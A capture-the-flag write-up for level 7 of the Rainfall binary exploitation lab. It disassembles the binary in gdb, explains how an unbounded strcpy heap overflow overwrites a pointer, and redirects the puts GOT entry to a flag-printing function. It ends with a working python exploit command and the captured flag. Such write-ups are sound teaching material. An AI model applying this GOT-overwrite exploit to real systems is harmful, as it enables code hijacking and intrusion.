# Rainfall

## Level7

```sh
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0804836c  _init
0x080483b0  printf
0x080483b0  printf@plt
0x080483c0  fgets
0x080483c0  fgets@plt
0x080483d0  time
0x080483d0  time@plt
0x080483e0  strcpy
0x080483e0  strcpy@plt
0x080483f0  malloc
0x080483f0  malloc@plt
0x08048400  puts
0x08048400  puts@plt
0x08048410  __gmon_start__
0x08048410  __gmon_start__@plt
0x08048420  __libc_start_main
0x08048420  __libc_start_main@plt
0x08048430  fopen
0x08048430  fopen@plt
0x08048440  _start
0x08048470  __do_global_dtors_aux
0x080484d0  frame_dummy
0x080484f4  m # <-----
0x08048521  main # <--------
0x08048610  __libc_csu_init
0x08048680  __libc_csu_fini
0x08048682  __i686.get_pc_thunk.bx
0x08048690  __do_global_ctors_aux
0x080486bc  _fini
```

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:     push   %ebp
   0x08048522 <+1>:     mov    %esp,%ebp
   0x08048524 <+3>:     and    $0xfffffff0,%esp
   0x08048527 <+6>:     sub    $0x20,%esp
   0x0804852a <+9>:     movl   $0x8,(%esp)
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>      # a = malloc(8)
   0x08048536 <+21>:    mov    %eax,0x1c(%esp)             # save a
   0x0804853a <+25>:    mov    0x1c(%esp),%eax
   0x0804853e <+29>:    movl   $0x1,(%eax)                 # a[0] = 1
   0x08048544 <+35>:    movl   $0x8,(%esp)
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>      # malloc(8)
   0x08048550 <+47>:    mov    %eax,%edx
   0x08048552 <+49>:    mov    0x1c(%esp),%eax
   0x08048556 <+53>:    mov    %edx,0x4(%eax)              # a[1] = buffer
   0x08048559 <+56>:    movl   $0x8,(%esp)
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>      # b = malloc(8)
   0x08048565 <+68>:    mov    %eax,0x18(%esp)             # save b
   0x08048569 <+72>:    mov    0x18(%esp),%eax
   0x0804856d <+76>:    movl   $0x2,(%eax)                 # b[0] = 2
   0x08048573 <+82>:    movl   $0x8,(%esp)
   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>      # malloc(8)
   0x0804857f <+94>:    mov    %eax,%edx
   0x08048581 <+96>:    mov    0x18(%esp),%eax
   0x08048585 <+100>:   mov    %edx,0x4(%eax)              # b[1] = buffer
   0x08048588 <+103>:   mov    0xc(%ebp),%eax              # argv
   0x0804858b <+106>:   add    $0x4,%eax
   0x0804858e <+109>:   mov    (%eax),%eax                 # argv[1]
   0x08048590 <+111>:   mov    %eax,%edx
   0x08048592 <+113>:   mov    0x1c(%esp),%eax             # a
   0x08048596 <+117>:   mov    0x4(%eax),%eax              # a[1]
   0x08048599 <+120>:   mov    %edx,0x4(%esp)
   0x0804859d <+124>:   mov    %eax,(%esp)
   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>      # strcpy(a[1], argv[1])
   0x080485a5 <+132>:   mov    0xc(%ebp),%eax
   0x080485a8 <+135>:   add    $0x8,%eax
   0x080485ab <+138>:   mov    (%eax),%eax                 # argv[2]
   0x080485ad <+140>:   mov    %eax,%edx
   0x080485af <+142>:   mov    0x18(%esp),%eax             # b
   0x080485b3 <+146>:   mov    0x4(%eax),%eax              # b[1]
   0x080485b6 <+149>:   mov    %edx,0x4(%esp)
   0x080485ba <+153>:   mov    %eax,(%esp)
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>      # strcpy(b[1], argv[2])
   0x080485c2 <+161>:   mov    $0x80486e9,%edx             # "r"
   0x080485c7 <+166>:   mov    $0x80486eb,%eax             # path
   0x080485cc <+171>:   mov    %edx,0x4(%esp)
   0x080485d0 <+175>:   mov    %eax,(%esp)
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>       # fopen(path, "r")
   0x080485d8 <+183>:   mov    %eax,0x8(%esp)
   0x080485dc <+187>:   movl   $0x44,0x4(%esp)             # 68
   0x080485e4 <+195>:   movl   $0x8049960,(%esp)           # global c
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>       # fgets(c, 68, fp)
   0x080485f0 <+207>:   movl   $0x8048703,(%esp)
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>        # puts(...)
   0x080485fc <+219>:   mov    $0x0,%eax
   0x08048601 <+224>:   leave
   0x08048602 <+225>:   ret
End of assembler dump.
```

```sh
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x18,%esp
   0x080484fa <+6>:     movl   $0x0,(%esp)
   0x08048501 <+13>:    call   0x80483d0 <time@plt>        # time(0)
   0x08048506 <+18>:    mov    $0x80486e0,%edx             # format
   0x0804850b <+23>:    mov    %eax,0x8(%esp)              # time
   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)        # c (flag)
   0x08048517 <+35>:    mov    %edx,(%esp)
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>      # printf(fmt, c, time)
   0x0804851f <+43>:    leave
   0x08048520 <+44>:    ret
End of assembler dump.
```
```sh
level7@RainFall:~$ ./level7 
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 hello world
~~
```
`main` needs `argv[1]` and `argv[2]`. It never calls `m`. It `fgets` the flag into a global `c`, then calls `puts` on another string. `m` would print `c`

`strcpy` has no bound. A long `argv[1]` overflows `a[1]` and overwrites `b[1]`. The second strcpy then writes `argv[2]` wherever `b[1]` points
Goal: `b[1]` = `GOT[puts]`, `argv[2]` = address of `m`

→ `strcpy(GOT[puts], &m)` → `puts` jumps to `m` → flag.

```sh
malloc(8)
mov    %eax,0x1c(%esp)
...
malloc(8)
mov    %eax,0x18(%esp)
```

Same as the previous exercice, we know that the `a` struct is located at `$esp+0x1c` and `b` is located at `$esp+0x18`

a[0] / b[0] are ints (4 bytes), so +4 reaches a[1] / b[1]

```sh
(gdb) set $a = *(int *)($esp+0x1c)
(gdb) set $b = *(int *)($esp+0x18)
(gdb) x/s *(char **)($a+4)          # "AAAA"
(gdb) x/s *(char **)($b+4)          # "BBBB"
```

We need the gap from buffer_a (where strcpy starts) to the slot b[1]
(the pointer the second strcpy will use):

```sh
(gdb) p/x ($b+4) - *(int *)($a+4)   # offset = 0x14 = 20
```

Now lets retrieve the puts GOT entry
```sh
(gdb) info function puts
All functions matching regular expression "puts":

Non-debugging symbols:
0x08048400  puts
0x08048400  puts@plt
(gdb) disas puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
```

We can now build our exploit payload

`A`:
20 padding chars - `"A" * 20`
GOT address - `0x8049928` -> `\x28\x99\x04\x08`

`B`:
m() address - `0x080484f4` -> `\xf4\x84\x04\x08`

```sh
level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1789495368
 ```